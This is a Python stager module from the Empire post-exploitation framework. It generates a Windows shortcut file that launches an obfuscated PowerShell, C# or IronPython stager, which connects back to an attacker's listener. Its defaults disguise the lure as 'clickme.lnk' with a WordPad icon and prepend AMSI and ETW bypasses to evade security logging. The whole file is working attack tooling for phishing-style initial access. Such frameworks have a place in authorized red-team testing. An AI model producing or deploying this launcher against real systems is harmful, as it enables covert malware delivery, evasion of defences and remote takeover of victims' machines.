import logging

from empire.server.common import pylnk

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "LNKLauncher",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@theguly",
                    "Link": "",
                }
            ],
            "Description": "Create a .LNK file that launches the Empire stager.",
            "Background": False,
            "OutputExtension": None,
            "OpsecSafe": False,
            "MinPSVersion": "2",
            "Comments": [
                "http://windowsitpro.com/powershell/working-shortcuts-windows-powershell",
                "http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html",
                "https://github.com/samratashok/nishang",
                "http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/",
                "lnk generation code ripped from pylnk library https://sourceforge.net/p/pylnk/home/Home/",
            ],
        }

        # any options needed by the module, settable during runtime
        self.options = {
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "clickme.lnk",
            },
            "PowershellPath": {
                "Description": "Path to powershell.exe",
                "Required": True,
                "Value": "C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe",
            },
            "Icon": {
                "Description": "Path to LNK icon.",
                "Required": False,
                "Value": "C:\\program files\\windows nt\\accessories\\wordpad.exe",
            },
            "LNKComment": {
                "Description": "LNK Comment.",
                "Required": False,
                "Value": "",
            },
            "Base64": {
                "Description": "Switch. Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        lnk_comment = self.options["LNKComment"]["Value"]
        powershell_path = self.options["PowershellPath"]["Value"]
        lnk_name = self.options["OutFile"]["Value"]
        lnk_icon = self.options["Icon"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]

        invoke_obfuscation = obfuscate.lower() == "true"

        encode = False
        if base64.lower() == "true":
            encode = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagers.generate_exe_oneliner(
                language=language,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )

        else:
            launcher = self.mainMenu.stagers.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                stagerRetries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )
        launcher = launcher.replace("powershell.exe ", "", 1)

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""
        else:
            link = pylnk.for_file(
                powershell_path, launcher, lnk_name, lnk_icon, lnk_comment
            )
            code = link.ret()

        return code
